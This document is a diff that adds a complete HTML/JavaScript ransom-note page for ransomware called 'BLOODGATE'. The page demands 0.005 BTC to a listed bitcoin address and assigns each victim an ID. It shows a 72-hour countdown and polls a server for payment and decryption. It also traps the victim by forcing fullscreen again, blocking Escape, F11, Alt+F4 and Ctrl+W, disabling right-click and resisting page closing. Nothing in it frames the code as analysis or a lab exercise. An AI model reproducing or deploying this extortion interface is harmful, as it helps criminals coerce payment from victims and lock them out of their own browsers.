@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🩸 BLOODGATE - Your Files Are Encrypted</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            cursor: default;
+        }
+        
+        body {
+            background: #1a0000;
+            color: #ff0000;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+        
+        /* Kiosk - No escape */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(ellipse at center, #2a0000 0%, #0a0000 100%);
+            z-index: -1;
+        }
+        
+        .container {
+            max-width: 800px;
+            width: 90%;
+            padding: 40px;
+            text-align: center;
+            background: rgba(0,0,0,0.85);
+            border: 3px solid #ff0000;
+            border-radius: 20px;
+            box-shadow: 0 0 50px rgba(255,0,0,0.3);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .skull {
+            font-size: 80px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); text-shadow: 0 0 50px red; }
+        }
+        
+        h1 {
+            font-size: 48px;
+            color: #ff0000;
+            text-shadow: 0 0 30px rgba(255,0,0,0.5);
+            margin: 20px 0;
+            letter-spacing: 4px;
+        }
+        
+        .subtitle {
+            font-size: 18px;
+            color: #ff3333;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #ff0000;
+            padding-bottom: 20px;
+        }
+        
+        .section {
+            background: rgba(255,0,0,0.05);
+            border: 1px solid rgba(255,0,0,0.2);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .section-title {
+            font-size: 14px;
+            color: #ff6666;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+        
+        .btc-address {
+            font-size: 20px;
+            color: #ff4444;
+            background: rgba(0,0,0,0.5);
+            padding: 15px;
+            border-radius: 8px;
+            word-break: break-all;
+            font-weight: bold;
+            letter-spacing: 1px;
+            border: 1px solid rgba(255,0,0,0.3);
+        }
+        
+        .amount {
+            font-size: 32px;
+            color: #ff0000;
+            font-weight: bold;
+            text-shadow: 0 0 20px rgba(255,0,0,0.3);
+        }
+        
+        .timer {
+            font-size: 28px;
+            color: #ff0000;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .warning {
+            color: #ff6666;
+            font-size: 14px;
+            margin-top: 10px;
+            border-top: 1px solid rgba(255,0,0,0.2);
+            padding-top: 15px;
+        }
+        
+        /* Decryption Section */
+        .decrypt-section {
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 2px solid rgba(255,0,0,0.3);
+        }
+        
+        .decrypt-input {
+            background: rgba(0,0,0,0.7);
+            border: 2px solid #ff0000;
+            color: #ff4444;
+            padding: 15px 20px;
+            font-size: 18px;
+            font-family: 'Courier New', monospace;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            text-align: center;
+            letter-spacing: 2px;
+            outline: none;
+            margin: 10px 0;
+        }
+        
+        .decrypt-input:focus {
+            border-color: #ff3333;
+            box-shadow: 0 0 20px rgba(255,0,0,0.2);
+        }
+        
+        .decrypt-input::placeholder {
+            color: #662222;
+        }
+        
+        .btn-decrypt {
+            background: linear-gradient(135deg, #ff0000, #990000);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .btn-decrypt:hover {
+            background: linear-gradient(135deg, #ff3333, #cc0000);
+            box-shadow: 0 0 30px rgba(255,0,0,0.3);
+        }
+        
+        .btn-decrypt:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .status-message {
+            margin: 15px 0;
+            font-size: 16px;
+            min-height: 30px;
+        }
+        
+        .status-message.error {
+            color: #ff3333;
+        }
+        
+        .status-message.success {
+            color: #33ff33;
+        }
+        
+        .status-message.paid {
+            color: #33ff33;
+            font-weight: bold;
+            font-size: 20px;
+            animation: pulse 1s ease-in-out infinite;
+        }
+        
+        /* QR Code placeholder */
+        .qr-placeholder {
+            display: inline-block;
+            padding: 15px;
+            background: white;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+        
+        .qr-placeholder img {
+            width: 150px;
+            height: 150px;
+        }
+        
+        /* No exit */
+        .no-exit {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            color: rgba(255,0,0,0.1);
+            font-size: 10px;
+            z-index: 0;
+        }
+        
+        /* Disable selection */
+        ::selection {
+            background: rgba(255,0,0,0.3);
+        }
+        
+        /* Responsive */
+        @media (max-width: 600px) {
+            .container { padding: 20px; }
+            h1 { font-size: 28px; }
+            .btc-address { font-size: 14px; }
+            .amount { font-size: 24px; }
+            .skull { font-size: 50px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="mainContainer">
+        <div class="skull">🩸</div>
+        <h1>BLOODGATE</h1>
+        <div class="subtitle">⚠️ YOUR FILES ARE ENCRYPTED ⚠️</div>
+
+        <div class="section">
+            <div class="section-title">💰 PAYMENT REQUIRED</div>
+            <div style="font-size:14px; color:#ff6666; margin-bottom:10px;">
+                Send <span class="amount">0.005 BTC</span> to this address:
+            </div>
+            <div class="btc-address" id="btcAddress">bc1qnjkxvj7avmet54w9rmzf0ldftwzh2fcwsdxuw7</div>
+            <div style="margin:15px 0;">
+                <span style="color:#ff6666; font-size:13px;">⏳ Time Remaining:</span>
+                <div class="timer" id="timer">72:00:00</div>
+            </div>
+            <div style="color:#ff4444; font-size:14px; border-top:1px solid rgba(255,0,0,0.2); padding-top:15px;">
+                🔒 AES-256 Encryption | 🔑 Unique Decryption Key
+            </div>
+        </div>
+
+        <div class="section" id="paymentStatus" style="border-color:#ff3333;">
+            <div class="section-title">📡 PAYMENT STATUS</div>
+            <div id="statusDisplay" style="color:#ff6666;">Waiting for payment...</div>
+            <div style="margin-top:10px; font-size:12px; color:#884444;">
+                ⏳ Checking blockchain every 30 seconds
+            </div>
+            <button onclick="checkPayment()" style="background:rgba(255,0,0,0.2); border:1px solid #ff0000; color:#ff4444; padding:8px 20px; border-radius:5px; cursor:pointer; margin-top:10px; font-family:'Courier New',monospace;">
+                🔄 Check Payment
+            </button>
+        </div>
+
+        <div class="decrypt-section">
+            <div class="section-title">🔑 ENTER DECRYPTION KEY</div>
+            <div style="font-size:13px; color:#ff6666; margin-bottom:10px;">
+                If you have paid, enter your decryption key below
+            </div>
+            <input type="text" class="decrypt-input" id="decryptKey" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19" oninput="formatKey(this)">
+            <br>
+            <button class="btn-decrypt" id="decryptBtn" onclick="startDecryption()">
+                🔓 DECRYPT NOW
+            </button>
+            <div class="status-message" id="decryptStatus"></div>
+        </div>
+
+        <div class="warning">
+            ⚠️ DO NOT CLOSE THIS WINDOW ⚠️<br>
+            Your files will remain encrypted until payment is confirmed
+        </div>
+    </div>
+
+    <div class="no-exit">BLOODGATE v1.0</div>
+
+    <script>
+        let victimId = '';
+        let timerInterval;
+        let timeLeft = 72 * 3600; // 72 hours in seconds
+
+        // ===== GET VICTIM ID =====
+        function getVictimId() {
+            const stored = localStorage.getItem('bloodgate_victim_id');
+            if (stored) {
+                victimId = stored;
+                return;
+            }
+            // Generate if not exists
+            victimId = Math.random().toString(36).substring(2, 10).toUpperCase();
+            localStorage.setItem('bloodgate_victim_id', victimId);
+        }
+
+        // ===== FORMAT KEY INPUT =====
+        function formatKey(input) {
+            let value = input.value.replace(/[^a-zA-Z0-9]/g, '');
+            if (value.length > 16) value = value.substring(0, 16);
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += '-';
+                formatted += value[i];
+            }
+            input.value = formatted.toUpperCase();
+        }
+
+        // ===== CHECK PAYMENT =====
+        async function checkPayment() {
+            const statusDiv = document.getElementById('statusDisplay');
+            statusDiv.textContent = '🔄 Checking payment...';
+            statusDiv.style.color = '#ffaa44';
+
+            try {
+                const response = await fetch('/api/check-payment', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ victimId })
+                });
+                const data = await response.json();
+
+                if (data.paid) {
+                    statusDiv.innerHTML = '✅ PAYMENT CONFIRMED!';
+                    statusDiv.style.color = '#33ff33';
+                    document.getElementById('paymentStatus').style.borderColor = '#33ff33';
+                    document.getElementById('statusDisplay').textContent = '✅ Payment confirmed! Get your decryption key from the admin.';
+                } else {
+                    statusDiv.innerHTML = '⏳ Waiting for payment...<br><span style="font-size:12px;color:#884444;">Send 0.005 BTC to the address above</span>';
+                    statusDiv.style.color = '#ff6666';
+                }
+            } catch (error) {
+                statusDiv.textContent = '❌ Error checking payment';
+                statusDiv.style.color = '#ff3333';
+            }
+        }
+
+        // ===== START DECRYPTION =====
+        async function startDecryption() {
+            const keyInput = document.getElementById('decryptKey');
+            const statusDiv = document.getElementById('decryptStatus');
+            const btn = document.getElementById('decryptBtn');
+
+            const decryptionKey = keyInput.value.replace(/-/g, '');
+            if (decryptionKey.length !== 16) {
+                statusDiv.textContent = '⚠️ Please enter a valid 16-character key (XXXX-XXXX-XXXX-XXXX)';
+                statusDiv.className = 'status-message error';
+                return;
+            }
+
+            btn.disabled = true;
+            btn.textContent = '⏳ Decrypting...';
+            statusDiv.textContent = '🔓 Decrypting your files...';
+            statusDiv.className = 'status-message';
+
+            try {
+                // Send decryption request to server
+                const response = await fetch('/api/decrypt-files', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        victimId,
+                        decryptionKey
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    statusDiv.textContent = '✅ FILES DECRYPTED SUCCESSFULLY!';
+                    statusDiv.className = 'status-message success';
+                    btn.textContent = '✅ COMPLETE';
+                    
+                    // Show success animation
+                    document.body.style.background = 'linear-gradient(135deg, #003300, #001a00)';
+                    document.querySelector('.container').style.borderColor = '#33ff33';
+                    document.querySelector('.container').style.boxShadow = '0 0 50px rgba(0,255,0,0.2)';
+                    document.querySelector('.skull').textContent = '✅';
+                    
+                    // Close after 5 seconds
+                    setTimeout(() => {
+                        window.close();
+                    }, 5000);
+                } else {
+                    statusDiv.textContent = '❌ ' + (data.error || 'Decryption failed');
+                    statusDiv.className = 'status-message error';
+                    btn.disabled = false;
+                    btn.textContent = '🔓 DECRYPT NOW';
+                }
+            } catch (error) {
+                statusDiv.textContent = '❌ Error: ' + error.message;
+                statusDiv.className = 'status-message error';
+                btn.disabled = false;
+                btn.textContent = '🔓 DECRYPT NOW';
+            }
+        }
+
+        // ===== TIMER =====
+        function updateTimer() {
+            if (timeLeft <= 0) {
+                document.getElementById('timer').textContent = '00:00:00';
+                document.getElementById('timer').style.color = '#ff0000';
+                return;
+            }
+
+            timeLeft--;
+            const hours = Math.floor(timeLeft / 3600);
+            const minutes = Math.floor((timeLeft % 3600) / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('timer').textContent = 
+                String(hours).padStart(2, '0') + ':' +
+                String(minutes).padStart(2, '0') + ':' +
+                String(seconds).padStart(2, '0');
+
+            // Warning when time is low
+            if (timeLeft < 3600) {
+                document.getElementById('timer').style.color = '#ff3333';
+                document.getElementById('timer').style.textShadow = '0 0 30px rgba(255,0,0,0.5)';
+            }
+        }
+
+        // ===== PREVENT CLOSE =====
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = '⚠️ Your files are encrypted! Closing will not decrypt them.';
+            return '⚠️ Your files are encrypted! Closing will not decrypt them.';
+        });
+
+        // ===== FULLSCREEN =====
+        function goFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+        }
+
+        // ===== INIT =====
+        getVictimId();
+        updateTimer();
+        timerInterval = setInterval(updateTimer, 1000);
+
+        // Check payment every 30 seconds
+        setInterval(checkPayment, 30000);
+
+        // Fullscreen on load
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(goFullscreen, 1000);
+        });
+
+        // Re-enter fullscreen if escaped
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                setTimeout(goFullscreen, 500);
+            }
+        });
+
+        // Also block F11, ESC, Alt+F4, Ctrl+W, Ctrl+Shift+W
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F11' || e.key === 'Escape' || 
+                (e.ctrlKey && (e.key === 'w' || e.key === 'W')) ||
+                (e.altKey && e.key === 'F4') ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'w' || e.key === 'W'))) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        });
+
+        // Right click disabled
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        console.log('🩸 BLOODGATE ACTIVATED');
+        console.log(`🆔 Victim ID: ${victimId}`);
+        console.log('💰 Send 0.005 BTC to: bc1qnjkxvj7avmet54w9rmzf0ldftwzh2fcwsdxuw7');
+    </script>
+
+</body>
+</html>
